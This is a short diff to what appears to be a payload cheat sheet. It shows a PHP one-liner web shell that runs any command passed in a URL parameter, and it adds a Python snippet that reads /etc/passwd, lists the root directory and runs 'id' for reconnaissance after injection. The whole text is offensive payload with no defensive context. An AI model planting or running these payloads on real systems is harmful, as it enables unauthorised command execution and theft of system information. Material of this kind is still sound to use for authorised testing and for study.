@@ -28,3 +28,14 @@ php oneliner
 ```php
 <?php system($_GET['cmd']) ?>
 ```
+
+
+#### python 
+
+```python3
+f = open("/etc/passwd", "r")
+print(f.read()) 
+print(__import__("os").getcwd())
+print(__import__("os").listdir('/'))
+print(__import__("os").popen("id").read())
+```
